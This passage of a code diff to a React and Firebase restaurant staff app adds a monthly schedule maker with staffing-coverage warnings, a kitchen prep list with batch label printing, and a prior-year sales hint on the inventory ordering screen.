-              </div>
-            </div>
-          </div>
+        <div key={n.id} className={`p-4 rounded-3xl border shadow-sm flex gap-3 ${n.isImportant ? 'bg-red-50 border-red-200' : 'bg-white dark:bg-slate-800 dark:border-slate-700'}`}>
+          {n.author !== 'System Alert' && <img src={getAvatar(n.author, authorUser?.photoURL)} className="w-10 h-10 rounded-full flex-shrink-0" alt="pic"/>}
+          <div className="flex-1"><div className="flex justify-between items-start mb-1"><span className={`font-black text-sm ${n.isImportant ? 'text-red-700' : 'text-blue-600 dark:text-blue-400'}`}>{n.author}</span><span className="text-[10px] font-bold text-slate-400">{new Date(n.date).toLocaleDateString()}</span></div><p className={`font-medium leading-snug ${n.isImportant?'text-red-900':'text-slate-800 dark:text-slate-200'}`}>{n.title}</p></div>
+          {appUser?.isAdmin && <button onClick={() => deleteDoc(doc(db, "events", n.id))} className="text-slate-300 hover:text-red-500 self-start"><Trash2 size={16}/></button>}
         </div>
       )})}</div>
     </div>
   )
 };
 
-// --- COMPACT MONTH VIEW (Print Landscape Fix) ---
+// --- COMPACT MONTH VIEW ---
 const TabMonth = ({ currentDate, users, shifts }) => {
   const monthStr = getMonthStr(currentDate); const firstDay = new Date(monthStr+'-01T12:00:00').getDay(); const days = getDaysInMonth(monthStr);
   return (
-    <div className="bg-white dark:bg-slate-800 border dark:border-slate-700 rounded-3xl overflow-hidden shadow-sm">
-      <style>{`@media print { 
-        @page { size: landscape; margin: 0.5in; }
-        body, html { background: white !important; }
-        .no-print { display: none !important; }
-        .print-container { width: 100% !important; border: none !important; }
-        .cell { border: 1px solid #000 !important; background: transparent !important; }
-        .print-text { color: black !important; }
-      }`}</style>
-      <div className="flex justify-between items-center p-4 bg-slate-900 no-print">
-        <h3 className="font-black text-white flex items-center gap-2"><Calendar size={20}/> {formatDisplayMonth(monthStr)}</h3>
-        <button onClick={()=>window.print()} className="bg-blue-600 hover:bg-blue-500 text-white px-6 py-2 rounded-xl font-black text-sm shadow-md transition-colors">Print Calendar</button>
-      </div>
-      <div className="grid grid-cols-7 border-t border-l dark:border-slate-700 print-container">
-        {['Sun','Mon','Tue','Wed','Thu','Fri','Sat'].map(d=><div key={d} className="p-2 bg-slate-50 dark:bg-slate-900 text-center font-black text-[10px] text-slate-500 border-b border-r dark:border-slate-700 uppercase tracking-widest cell print-text">{d}</div>)}
-        {Array.from({length:firstDay}).map((_,i)=><div key={`e-${i}`} className="bg-slate-50/50 dark:bg-slate-800/50 border-b border-r dark:border-slate-700 min-h-[80px] cell"/>)}
+    <div className="bg-white dark:bg-slate-800 border dark:border-slate-700 rounded-2xl overflow-hidden shadow-sm print-container">
+      <style>{`@media print { .no-print{display:none;} .print-container{position:absolute;top:0;left:0;width:100%;} .cell{border:1px solid #000!important;} }`}</style>
+      <div className="flex justify-end p-2 no-print"><button onClick={()=>window.print()} className="bg-slate-900 text-white px-4 py-2 rounded-lg font-bold text-xs">Print Calendar</button></div>
+      <div className="grid grid-cols-7 border-t border-l dark:border-slate-700">
+        {['Sun','Mon','Tue','Wed','Thu','Fri','Sat'].map(d=><div key={d} className="p-1 bg-slate-50 dark:bg-slate-900 text-center font-black text-[10px] text-slate-500 border-b border-r dark:border-slate-700 uppercase cell">{d}</div>)}
+        {Array.from({length:firstDay}).map((_,i)=><div key={`e-${i}`} className="bg-slate-50/50 dark:bg-slate-800/50 border-b border-r dark:border-slate-700 min-h-[50px] cell"/>)}
         {Array.from({length:days}).map((_,i)=>{
           const date = `${monthStr}-${String(i+1).padStart(2,'0')}`; const dayShifts = shifts.filter(s=>s.date===date&&s.isPublished);
           return (
-            <div key={date} className="p-1 border-b border-r dark:border-slate-700 min-h-[80px] flex flex-col cell overflow-hidden">
-              <span className="text-right text-[10px] font-black text-slate-400 mb-1 print-text">{i+1}</span>
-              <div className="space-y-1 overflow-y-auto custom-scrollbar flex-1">{dayShifts.map(s=><div key={s.id} className={`text-[9px] font-black px-1 py-0.5 rounded leading-tight truncate print-text ${s.role==='Bartender'?'bg-blue-100 text-blue-800':'bg-orange-100 text-orange-800'}`}>{users.find(u=>u.id===s.employeeId)?.name.split(' ')[0]} {formatShortTime(s.startTime)}-{formatShortTime(s.endTime)}</div>)}</div>
+            <div key={date} className="p-0.5 border-b border-r dark:border-slate-700 min-h-[50px] flex flex-col cell overflow-hidden">
+              <span className="text-right text-[9px] font-black text-slate-400 mb-0.5">{i+1}</span>
+              <div className="space-y-0.5 overflow-y-auto custom-scrollbar flex-1">{dayShifts.map(s=><div key={s.id} className={`text-[8px] font-bold px-0.5 rounded leading-tight truncate ${s.role==='Bartender'?'bg-blue-100 text-blue-800':'bg-orange-100 text-orange-800'}`}>{users.find(u=>u.id===s.employeeId)?.name.split(' ')[0]} {formatShortTime(s.startTime)}-{formatShortTime(s.endTime)}</div>)}</div>
             </div>
           )
         })}
+      </div>
+    </div>
+  );
+};
+
+// --- SCHEDULE MAKER (With Strict Validation & Format Fix) ---
+const TabSchedule = ({ currentDate, users, shifts, addToast }) => {
+  const [selectedEmp, setSelectedEmp] = useState(''); const [assignDates, setAssignDates] = useState([]); const [presetShift, setPresetShift] = useState('Custom'); const [startTime, setStartTime] = useState('16:00'); const [endTime, setEndTime] = useState('21:00');
+  const displayUsers = [...users].sort((a,b) => a.role === b.role ? a.name.localeCompare(b.name) : (a.role==='Bartender'?-1:1));
+  const monthStr = getMonthStr(currentDate); const monthDays = Array.from({length: getDaysInMonth(monthStr)}).map((_, i) => `${monthStr}-${String(i+1).padStart(2, '0')}`);
+  const monthShifts = shifts.filter(s => s.date.startsWith(monthStr));
+
+  const SHIFT_PRESETS = [ { label: "9a-3p", start: "09:00", end: "15:00" }, { label: "10a-4p", start: "10:00", end: "16:00" }, { label: "10a-9p", start: "10:00", end: "21:00" }, { label: "11a-3p", start: "11:00", end: "15:00" }, { label: "11a-4p", start: "11:00", end: "16:00" }, { label: "4p-9p", start: "16:00", end: "21:00" }, { label: "7p-close", start: "19:00", end: "CLOSE" }, { label: "9p-close", start: "21:00", end: "CLOSE" }, { label: "Custom", start: "", end: "" } ];
+  const handlePresetChange = (e) => { const val = e.target.value; setPresetShift(val); const p = SHIFT_PRESETS.find(x => x.label === val); if (p && val !== 'Custom') { setStartTime(p.start); if (p.end !== 'CLOSE') setEndTime(p.end); } };
+
+  const validateSchedule = () => {
+    const warnings = [];
+    monthDays.forEach(d => {
+       const dShifts = monthShifts.filter(s => s.date === d); if (dShifts.length === 0) return;
+       const dObj = new Date(d + 'T12:00:00'); const day = dObj.getDay();
+       const isFri = day===5; const isSat = day===6; const isSun = day===0;
+       const dateFmt = `${dObj.getMonth()+1}/${dObj.getDate()}`;
+       const bar = dShifts.filter(s => s.role === 'Bartender'); const kit = dShifts.filter(s => s.role === 'Kitchen');
+
+       if (!kit.some(s => s.startTime >= '09:00' && s.startTime <= '10:00')) warnings.push(`[${dateFmt}] Kitchen: Missing opener (9am-10am)`);
+       if (!kit.some(s => s.endTime >= '21:00')) warnings.push(`[${dateFmt}] Kitchen: Missing closer (9pm)`);
+       
+       const bClose = (isFri || isSat) ? '02:30' : '02:00';
+       if (!bar.some(s => s.startTime <= '11:00')) warnings.push(`[${dateFmt}] Bar: Missing opener (11am)`);
+       if (!bar.some(s => s.endTime === 'CLOSE' || s.endTime >= bClose)) warnings.push(`[${dateFmt}] Bar: Missing closer (${bClose==='02:30'?'2:30am':'2am'})`);
+
+       const countO = (arr, st, en) => arr.filter(s => s.startTime <= st && (s.endTime >= en || s.endTime === 'CLOSE')).length;
+       
+       const lBar = countO(bar, '11:00', '14:00'); const lKit = countO(kit, '11:00', '14:00');
+       if (day >= 1 && day <= 4) { if(lBar < 2 || lKit < 2) warnings.push(`[${dateFmt}] Lunch Rush (M-Th): Needs 2 Bar/2 Kit, found ${lBar} Bar/${lKit} Kit`); }
+       else if (isFri) { if(lBar < 2 || lKit < 3) warnings.push(`[${dateFmt}] Lunch Rush (Fri): Needs 2 Bar/3 Kit, found ${lBar} Bar/${lKit} Kit`); }
+       else if (isSat || isSun) { if(lBar < 1 || lKit < 2) warnings.push(`[${dateFmt}] Day Rush (Sat-Sun): Needs 1 Bar/2 Kit, found ${lBar} Bar/${lKit} Kit`); }
+
+       const dBar = countO(bar, '17:00', '20:00'); const dKit = countO(kit, '17:00', '20:00');
+       if (day >= 1 && day <= 4) { if(dBar < 2 || dKit < 2) warnings.push(`[${dateFmt}] Dinner Rush (M-Th): Needs 2 Bar/2 Kit, found ${dBar} Bar/${dKit} Kit`); }
+       else if (isFri) { if(dBar < 2 || dKit < 3) warnings.push(`[${dateFmt}] Dinner Rush (Fri): Needs 2 Bar/3 Kit, found ${dBar} Bar/${dKit} Kit`); }
+
+       const cls = bar.filter(s => s.endTime === 'CLOSE' || s.endTime >= bClose).length;
+       if ((isFri || isSat) && cls < 2) warnings.push(`[${dateFmt}] Bar: Needs 2 closers (2:30am), found ${cls}`);
+       else if (!isFri && !isSat && cls < 1) warnings.push(`[${dateFmt}] Bar: Needs 1 closer (2am), found ${cls}`);
+       
+       if (bar.length < 1) warnings.push(`[${dateFmt}] Bar: No bartenders scheduled.`);
+       if (kit.length < 1) warnings.push(`[${dateFmt}] Kitchen: No kitchen scheduled.`);
+    });
+    return warnings;
+  };
+
+  const handleCellClick = (d, empId) => {
+    if (d < getToday()) return addToast("Locked", "Cannot edit past dates.");
+    const existing = monthShifts.find(s => s.date === d && s.employeeId === empId);
+    if (existing) { if(window.confirm("Delete shift?")) deleteDoc(doc(db,"shifts",existing.id)); return; }
+    setSelectedEmp(empId); if (assignDates.includes(d)) setAssignDates(assignDates.filter(x => x!==d)); else setAssignDates([...assignDates, d]);
+  };
+
+  const handleAssign = async () => {
+    if (!selectedEmp || assignDates.length === 0) return; const emp = users.find(u => u.id === selectedEmp);
+    for (const d of assignDates) { await addDoc(collection(db, "shifts"), { date: d, employeeId: emp.id, role: emp.role, startTime, endTime: presetShift.includes('close')?'CLOSE':endTime, isPublished: false }); }
+    setAssignDates([]); addToast('Assigned', `Added ${assignDates.length} shifts.`);
+  };
+
+  const handlePublish = async () => {
+    const warnings = validateSchedule();
+    if (warnings.length > 0) { if (!window.confirm(`⚠️ SCHEDULE WARNINGS FOUND:\n\n${warnings.join('\n')}\n\nDo you want to publish anyway?`)) return; }
+    else { if(!window.confirm("Publish schedule? Notifications will be sent.")) return; }
+    const unpub = monthShifts.filter(s => !s.isPublished); for(const s of unpub) await updateDoc(doc(db, "shifts", s.id), {isPublished:true});
+    const tokens = users.filter(u=>u.fcmToken).map(u=>u.fcmToken);
+    if(tokens.length>0) fetch('/api/send-push', {method:'POST', body:JSON.stringify({title:"New Schedule", body:`Roster published for ${monthStr}.`, tokens})});
+    addToast("Published", "Schedule is live.");
+  };
+
+  return (
+    <div className="space-y-4 pb-12">
+      <div className="flex justify-between items-center bg-white dark:bg-slate-800 p-4 rounded-2xl shadow-sm border dark:border-slate-700">
+         <h3 className="font-black text-xl flex items-center gap-2 dark:text-white"><Calendar className="text-blue-500"/> Schedule Maker</h3>
+         <button onClick={handlePublish} className="bg-emerald-600 text-white px-4 py-2 rounded-xl font-bold shadow-sm">Publish All</button>
+      </div>
+      <div className="overflow-x-auto bg-white dark:bg-slate-800 rounded-2xl border dark:border-slate-700 shadow-sm">
+        <table className="w-full text-left text-[10px] border-collapse">
+          <thead><tr className="bg-slate-50 dark:bg-slate-900 border-b dark:border-slate-700"><th className="p-2 font-bold sticky left-0 bg-slate-50 dark:bg-slate-900 z-20 w-24 border-r dark:border-slate-700 dark:text-slate-300">Staff</th>{monthDays.map(d=><th key={d} className={`p-1 text-center border-r dark:border-slate-700 min-w-[36px] ${new Date(d+'T12:00').getDay()%6===0?'bg-slate-100 dark:bg-slate-800':''}`}><div className="font-bold text-slate-400 uppercase">{new Date(d+'T12:00').toLocaleDateString('en-US',{weekday:'short'})}</div><div className="text-sm font-black dark:text-white">{parseInt(d.split('-')[2])}</div></th>)}</tr></thead>
+          <tbody className="divide-y dark:divide-slate-700">{displayUsers.map(u => (
+            <tr key={u.id} className={selectedEmp===u.id?'bg-blue-50/50 dark:bg-blue-900/20':''}>
+              <td onClick={()=>{setSelectedEmp(u.id);setAssignDates([]);}} className={`p-2 font-bold sticky left-0 z-10 border-r dark:border-slate-700 cursor-pointer truncate ${selectedEmp===u.id?'bg-blue-100 dark:bg-blue-800 text-blue-700 dark:text-white':'bg-white dark:bg-slate-800 dark:text-slate-300'}`}>{u.name.split(' ')[0]}</td>
+              {monthDays.map(d => {
+                const shift = monthShifts.find(s=>s.date===d&&s.employeeId===u.id); const sel = assignDates.includes(d) && selectedEmp===u.id;
+                return (<td key={d} onClick={()=>handleCellClick(d,u.id)} className={`p-0.5 border-r dark:border-slate-700 cursor-pointer transition-all ${sel?'bg-amber-400 dark:bg-amber-500 outline outline-4 outline-red-600 shadow-2xl scale-[1.15] z-50 relative':'hover:bg-slate-200 dark:hover:bg-slate-700'}`}>{shift ? <div className={`w-full rounded font-bold text-[9px] py-1 text-center text-white ${shift.isPublished?(u.role==='Bartender'?'bg-blue-500':'bg-orange-500'):'bg-slate-400'}`} title={`${formatShortTime(shift.startTime)} - ${formatShortTime(shift.endTime)}`}>{formatShortTime(shift.startTime)}-{formatShortTime(shift.endTime)}</div> : <div className="h-5 rounded"></div>}</td>)
+              })}
+            </tr>
+          ))}</tbody>
+        </table>
+      </div>
+      <div className="flex flex-col md:flex-row gap-3 p-4 bg-slate-100 dark:bg-slate-800 rounded-xl border border-slate-200 dark:border-slate-700 items-end">
+        <div className="w-full md:w-48"><label className="block text-[10px] font-bold text-slate-600 dark:text-slate-400 uppercase mb-1">Staff</label><select value={selectedEmp} onChange={e=>{setSelectedEmp(e.target.value); setAssignDates([]);}} className="w-full p-2.5 text-sm bg-white dark:bg-slate-700 border dark:border-slate-600 dark:text-white rounded-lg font-bold outline-none"><option value="">- Choose -</option>{displayUsers.map(u=><option key={u.id} value={u.id}>{u.name}</option>)}</select></div>
+        <div className="w-full md:w-36"><label className="block text-[10px] font-bold text-slate-600 dark:text-slate-400 uppercase mb-1">Preset</label><select value={presetShift} onChange={handlePresetChange} className="w-full p-2.5 text-sm bg-white dark:bg-slate-700 border dark:border-slate-600 dark:text-white rounded-lg font-bold outline-none">{SHIFT_PRESETS.map(p=><option key={p.label} value={p.label}>{p.label}</option>)}</select></div>
+        <div className="w-full md:w-28"><label className="block text-[10px] font-bold text-slate-600 dark:text-slate-400 uppercase mb-1">Start</label><input type="time" value={startTime} onChange={e=>{setStartTime(e.target.value);setPresetShift('Custom');}} className="w-full p-2.5 text-sm bg-white dark:bg-slate-700 border dark:border-slate-600 dark:text-white rounded-lg font-bold outline-none"/></div>
+        <div className="w-full md:w-28"><label className="block text-[10px] font-bold text-slate-600 dark:text-slate-400 uppercase mb-1">End</label><input type="time" value={presetShift.includes('close')?'':endTime} disabled={presetShift.includes('close')} onChange={e=>{setEndTime(e.target.value);setPresetShift('Custom');}} className="w-full p-2.5 text-sm bg-white dark:bg-slate-700 border dark:border-slate-600 dark:text-white rounded-lg font-bold outline-none disabled:bg-slate-200 disabled:text-slate-400"/></div>
+        <button onClick={handleAssign} disabled={!selectedEmp||assignDates.length===0} className="bg-blue-600 text-white px-6 h-[42px] rounded-lg font-bold shadow-sm disabled:opacity-50 w-full md:w-auto">Assign ({assignDates.length})</button>
+      </div>
+    </div>
+  );
+};
+
+// --- PREP LIST (Normal UI - Triggers the App-Level Print Screen) ---
+const TabPrep = ({ currentDate, prepItems, appUser, setLabelsToPrint }) => {
+  const [text, setText] = useState(''); const [cat, setCat] = useState('General'); const [isMaster, setIsMaster] = useState(true); const [prepDate, setPrepDate] = useState(currentDate);
+  const items = prepItems.filter(p=>p.date===prepDate||p.isMaster);
+
+  const handleAdd = async (e) => { e.preventDefault(); if(text.trim()) { await addDoc(collection(db, "prepItems"), { date: isMaster?'MASTER':prepDate, text: text.trim(), category: cat, isCompleted: false, completedDates: {}, isMaster, qty: 1, completedBy: null, isSelected: false }); setText(''); } };
+  const toggleStatus = async (item) => { 
+    if (item.isMaster) { const dts = {...(item.completedDates||{})}; dts[prepDate] = dts[prepDate] ? null : appUser.name; await updateDoc(doc(db, "prepItems", item.id), { completedDates: dts, isSelected: false }); }
+    else { await updateDoc(doc(db, "prepItems", item.id), { isCompleted: !item.isCompleted, completedBy: !item.isCompleted ? appUser.name : null, isSelected: false }); }
+  };
+  const updateQty = async (id, currentQty, change) => { await updateDoc(doc(db, "prepItems", id), { qty: Math.max(1, currentQty + change) }); };
+  const toggleSelect = async (i) => await updateDoc(doc(db, "prepItems", i.id), { isSelected: !i.isSelected });
+  
+  const handleBatchDone = async () => {
+    const toComplete = items.filter(i => i.isSelected); if (toComplete.length === 0) return;
+    for (const item of toComplete) { if (item.isMaster) { const dts = {...(item.completedDates||{})}; dts[prepDate] = appUser.name; await updateDoc(doc(db, "prepItems", item.id), { completedDates: dts, isSelected: false }); } else { await updateDoc(doc(db, "prepItems", item.id), { isCompleted: true, completedBy: appUser.name, isSelected: false }); } }
+  };
+
+  const triggerBatchPrint = () => {
+    const selected = items.filter(i => i.isSelected); if (selected.length === 0) return;
+    const toPrint = []; selected.forEach(item => { for (let i = 0; i < (item.qty||1); i++) { toPrint.push({ ...item, printId: `${item.id}-${i}-${Date.now()}` }); } });
+    
+    // THIS CALLS THE APP-LEVEL COMPONENT. It destroys TabPrep entirely so the browser CANNOT see it.
+    setLabelsToPrint({ items: toPrint, prepDate }); 
+  };
+
+  const globalSelectedCount = items.filter(i => i.isSelected).length;
+  const groupedItems = items.reduce((acc, i) => { const c = i.category || 'General'; if(!acc[c]) acc[c]=[]; acc[c].push(i); return acc; }, {});
+
+  return (
+    <div className="max-w-2xl mx-auto space-y-3 relative pb-40">
+      <div className="bg-white dark:bg-slate-800 border dark:border-slate-700 p-3 rounded-xl flex justify-between items-center shadow-sm">
+         <h3 className="font-bold flex items-center gap-2 text-sm dark:text-white"><ClipboardList className="text-blue-500" size={18}/> Prep List For:</h3>
+         <input type="date" value={prepDate} onChange={e=>setPrepDate(e.target.value)} className="p-1.5 border rounded-lg outline-none text-sm font-bold dark:bg-slate-700 dark:border-slate-600 dark:text-white"/>
+      </div>
+      <form onSubmit={handleAdd} className="bg-white dark:bg-slate-800 border dark:border-slate-700 p-2 pl-3 rounded-xl flex flex-col sm:flex-row gap-2 shadow-sm items-center">
+        <input type="text" value={text} onChange={e=>setText(e.target.value)} className="flex-1 w-full p-1.5 bg-transparent text-sm outline-none font-medium dark:text-white" placeholder="Add prep task..." required/>
+        <select value={cat} onChange={e=>setCat(e.target.value)} className="w-full sm:w-28 p-1.5 text-xs font-bold bg-slate-50 dark:bg-slate-700 border dark:border-slate-600 rounded-lg outline-none dark:text-white"><option>General</option><option>Meat</option><option>Produce</option><option>Dairy</option><option>Sauces</option><option>Line Prep</option></select>
+        <div className="flex items-center gap-3 w-full sm:w-auto justify-between border-t sm:border-t-0 pt-2 sm:pt-0 dark:border-slate-700">
+          <label className="flex items-center gap-2 text-xs font-bold text-slate-500 cursor-pointer"><input type="checkbox" checked={isMaster} onChange={e=>setIsMaster(e.target.checked)} className="w-4 h-4"/> Master</label>
+          <button className="bg-blue-600 text-white p-2 rounded-lg font-bold"><Plus size={18}/></button>
+        </div>
+      </form>
+      
+      <div className="bg-white dark:bg-slate-800 rounded-xl border dark:border-slate-700 overflow-hidden shadow-sm">
+        {Object.entries(groupedItems).map(([category, catItems]) => (
+          <div key={category}>
+            <div className="bg-slate-50 dark:bg-slate-900/50 px-3 py-1.5 border-y dark:border-slate-700 font-black text-[10px] uppercase text-slate-500 tracking-wider flex justify-between"><span>{category}</span><span>{catItems.filter(i => (i.isMaster ? !!i.completedDates?.[prepDate] : i.isCompleted)).length}/{catItems.length} Done</span></div>
+            <div className="divide-y dark:divide-slate-700">
+              {catItems.map(i=>{
+                const isDone = i.isMaster ? !!i.completedDates?.[prepDate] : i.isCompleted; const doneBy = i.isMaster ? i.completedDates?.[prepDate] : i.completedBy; const qty = i.qty||1;
+                return (
+                <div key={i.id} className={`p-2 flex items-center gap-2 transition-colors ${i.isSelected ? 'bg-blue-50 dark:bg-blue-900/20' : 'hover:bg-slate-50 dark:hover:bg-slate-700/50'}`}>
+                  <input type="checkbox" checked={!!i.isSelected} onChange={()=>toggleSelect(i)} className="w-5 h-5 rounded border-slate-300 accent-blue-600 flex-shrink-0 cursor-pointer" />
+                  <div className="flex-1 min-w-0"><span className={`text-sm font-bold ${isDone?'line-through text-slate-400':'dark:text-white'}`}>{i.text}</span> {doneBy && <span className="text-[9px] font-black text-emerald-600 bg-emerald-50 dark:bg-emerald-900/30 px-1.5 py-0.5 rounded ml-2">✓ {doneBy}</span>} {i.isMaster&&<span className="block text-[9px] font-black text-blue-500 uppercase mt-0.5">Master Task</span>}</div>
+                  <div className="flex items-center gap-1.5 flex-shrink-0">
+                    <div className="flex items-center bg-slate-100 dark:bg-slate-700 rounded-lg border dark:border-slate-600 h-8"><button onClick={()=>updateQty(i.id,qty,-1)} className="w-6 h-full font-bold dark:text-white hover:bg-slate-200 transition-colors">-</button><span className="w-5 text-center text-xs font-bold dark:text-white">{qty}</span><button onClick={()=>updateQty(i.id,qty,1)} className="w-6 h-full font-bold dark:text-white hover:bg-slate-200 transition-colors">+</button></div>
+                    <button onClick={()=>toggleStatus(i)} className={`w-8 h-8 rounded-lg flex items-center justify-center font-bold ${isDone?'bg-slate-200 text-slate-500 dark:bg-slate-600':'bg-emerald-100 text-emerald-700 border border-emerald-200 dark:bg-emerald-900/40 dark:border-emerald-800 dark:text-emerald-400'}`}>{isDone ? <Repeat size={14}/> : <Check size={16}/>}</button>
+                    <button onClick={()=>deleteDoc(doc(db,"prepItems",i.id))} className="text-slate-300 hover:text-red-500 p-1.5"><Trash2 size={16}/></button>
+                  </div>
+                </div>
+              )})}
+            </div>
+          </div>
+        ))}
+      </div>
+      <div className="fixed bottom-0 left-0 right-0 p-3 bg-white dark:bg-slate-900 border-t dark:border-slate-800 z-50 shadow-[0_-4px_6px_-1px_rgba(0,0,0,0.1)]">
+        <div className="max-w-2xl mx-auto flex gap-2">
+          <button onClick={triggerBatchPrint} disabled={globalSelectedCount===0} className="flex-1 bg-blue-600 text-white p-3 rounded-xl font-black text-sm disabled:opacity-50">
+            🖨️ Print Labels ({globalSelectedCount})
+          </button>
+          <button onClick={handleBatchDone} disabled={globalSelectedCount===0} className="flex-1 bg-emerald-600 text-white p-3 rounded-xl font-black text-sm disabled:opacity-50">Mark Done</button>
+        </div>
       </div>
     </div>
   );
@@ -1005,6 +866,11 @@ const TabInventory = ({ inventoryItems, sales, addToast, appUser }) => {
     const pendingItems = inventoryItems.filter(i => (i.pendingQty || 0) > 0 && (supplier === 'PFG' ? (!i.supplier || i.supplier === 'PFG') : i.supplier === 'Badger'));
     for (const item of pendingItems) { await updateDoc(doc(db, "inventoryItems", item.id), { currentStock: item.currentStock + item.pendingQty, pendingQty: 0 }); }
     addToast('Inbound Ingested', `Stock loaded for ${supplier}.`);
+  };
+
+  const getHistoricalContext = () => {
+    const d = new Date(); d.setFullYear(d.getFullYear() - 1); const pastStr = d.toISOString().split('T')[0];
+    const pastSale = sales.find(s => s.date === pastStr); return pastSale ? `Last year (${pastStr}): $${pastSale.amount.toFixed(2)} [${pastSale.tag}]` : `No local trend data for this week last year.`;
   };
 
   const groupedItems = inventoryItems.filter(i => i.name.toLowerCase().includes(searchTerm.toLowerCase()) || (i.pfgCode && i.pfgCode.includes(searchTerm))).reduce((acc, item) => { if (!acc[item.category]) acc[item.category] = []; acc[item.category].push(item); return acc; }, {});
@@ -1043,9 +909,10 @@ const TabInventory = ({ inventoryItems, sales, addToast, appUser }) => {
       )}
       {appUser?.isAdmin && invTab === 'order' && (
         <div className="space-y-4">
-          <div className="flex justify-end gap-2 mb-2">{inventoryItems.some(i=>(i.pendingQty||0)>0&&i.supplier==='Badger') && <button onClick={()=>handleReceivePending('Badger')} className="bg-emerald-600 text-white px-4 py-2 rounded-xl font-bold text-sm shadow-sm hover:bg-emerald-500">Receive Badger</button>}{inventoryItems.some(i=>(i.pendingQty||0)>0&&(!i.supplier||i.supplier==='PFG')) && <button onClick={()=>handleReceivePending('PFG')} className="bg-emerald-600 text-white px-4 py-2 rounded-xl font-bold text-sm shadow-sm hover:bg-emerald-500">Receive PFG</button>}</div>
+          <div className="flex justify-end gap-2 mb-2">{inventoryItems.some(i=>(i.pendingQty||0)>0&&i.supplier==='Badger') && <button onClick={()=>handleReceivePending('Badger')} className="bg-emerald-600 text-white px-4 py-2 rounded-xl font-bold text-sm">Receive Badger</button>}{inventoryItems.some(i=>(i.pendingQty||0)>0&&(!i.supplier||i.supplier==='PFG')) && <button onClick={()=>handleReceivePending('PFG')} className="bg-emerald-600 text-white px-4 py-2 rounded-xl font-bold text-sm">Receive PFG</button>}</div>
+          <div className="bg-amber-50 dark:bg-slate-800 border border-amber-200 dark:border-slate-700 p-4 rounded-2xl shadow-sm"><h4 className="font-black text-amber-800 dark:text-amber-400 text-sm flex items-center gap-2 mb-1"><TrendingUp size={16}/> Smart Order Context</h4><p className="text-xs font-bold text-amber-700 dark:text-slate-300">{getHistoricalContext()}</p></div>
           <div className="bg-white dark:bg-slate-800 border dark:border-slate-700 rounded-3xl overflow-hidden shadow-sm">
-            <div className="p-4 bg-slate-900 border-b dark:border-slate-700 flex justify-between items-center"><h3 className="font-black text-lg text-white flex items-center gap-2"><TrendingUp size={18}/> Smart Deficit Report</h3><span className="bg-blue-600 text-white px-3 py-1 rounded-full font-black text-[10px] uppercase">{itemsToOrder.length} Items</span></div>
+            <div className="p-4 bg-slate-50 dark:bg-slate-900 border-b dark:border-slate-700 flex justify-between items-center"><h3 className="font-black text-lg dark:text-white">Smart Deficit Report</h3><span className="bg-blue-100 dark:bg-blue-900/30 text-blue-800 dark:text-blue-300 px-3 py-1 rounded-full font-black text-[10px] uppercase">{itemsToOrder.length} Items</span></div>
             <table className="w-full text-left">
               <thead><tr className="bg-slate-50 dark:bg-slate-900 border-b dark:border-slate-700 text-[9px] font-black text-slate-500 uppercase"><th className="p-3">Product</th><th className="p-3 text-center">Last Order</th><th className="p-3 text-right">Order Qty</th></tr></thead>
               <tbody className="divide-y dark:divide-slate-700">{itemsToOrder.map(item => {
@@ -1055,21 +922,21 @@ const TabInventory = ({ inventoryItems, sales, addToast, appUser }) => {
                     <td className="p-3"><span className="font-bold text-sm block dark:text-white">{item.name}</span><span className="text-[9px] font-bold text-slate-400 uppercase">{item.packSize||'1 CS'} • Par: {item.parLevel}</span></td>
                     <td className="p-3 text-center text-[10px] font-bold text-slate-400">{item.lastOrderedQty ? `${item.lastOrderedQty} (${item.lastOrderedDate})` : '--'}</td>
                     <td className="p-3">
-                      <div className="flex items-center justify-end gap-1"><button onClick={()=>handleOrderChange(item.id, -1, currentOrder)} className="w-8 h-8 rounded-lg bg-slate-100 dark:bg-slate-700 font-bold dark:text-white hover:bg-slate-200 transition-colors">-</button><input type="number" min="0" value={currentOrder} onChange={e=>setOrderOverrides(p=>({...p, [item.id]: parseInt(e.target.value)||0}))} className="w-12 h-8 text-center font-black bg-blue-50 dark:bg-slate-800 text-blue-700 dark:text-blue-400 rounded-lg outline-none border dark:border-slate-600"/><button onClick={()=>handleOrderChange(item.id, 1, currentOrder)} className="w-8 h-8 rounded-lg bg-slate-100 dark:bg-slate-700 font-bold dark:text-white hover:bg-slate-200 transition-colors">+</button></div>
+                      <div className="flex items-center justify-end gap-1"><button onClick={()=>handleOrderChange(item.id, -1, currentOrder)} className="w-8 h-8 rounded-lg bg-slate-100 dark:bg-slate-700 font-bold dark:text-white hover:bg-slate-200 transition-colors">-</button><input type="number" min="0" value={currentOrder} onChange={e=>setOrderOverrides(p=>({...p, [item.id]: parseInt(e.target.value)||0}))} className="w-12 h-8 text-center font-black bg-blue-50 dark:bg-slate-800 text-blue-700 dark:text-blue-400 rounded-lg outline-none"/><button onClick={()=>handleOrderChange(item.id, 1, currentOrder)} className="w-8 h-8 rounded-lg bg-slate-100 dark:bg-slate-700 font-bold dark:text-white hover:bg-slate-200 transition-colors">+</button></div>
                     </td>
                   </tr>
                 )
               })}</tbody>
             </table>
-            <div className="p-4 bg-slate-50 dark:bg-slate-900 border-t dark:border-slate-700 flex flex-col sm:flex-row justify-between items-center gap-4"><div className="text-left w-full sm:w-auto"><span className="block text-[10px] font-bold text-slate-400 uppercase tracking-widest mb-0.5">PFG Total</span><span className="font-black text-2xl dark:text-white">${getFinalOrderList('PFG').reduce((s,i)=>s+(i.price*i.orderQty),0).toFixed(2)}</span></div><div className="flex flex-col sm:flex-row gap-2 w-full sm:w-auto"><button onClick={()=>handleReviewOrder('Badger')} className="bg-slate-900 dark:bg-slate-700 text-white px-6 py-3 rounded-xl font-bold flex items-center justify-center gap-2 shadow-md"><MessageSquare size={16}/> Text Badger</button><button onClick={()=>handleReviewOrder('PFG')} className="bg-blue-600 text-white px-6 py-3 rounded-xl font-bold flex items-center justify-center gap-2 shadow-md hover:bg-blue-500"><Send size={16}/> Email PFG</button></div></div>
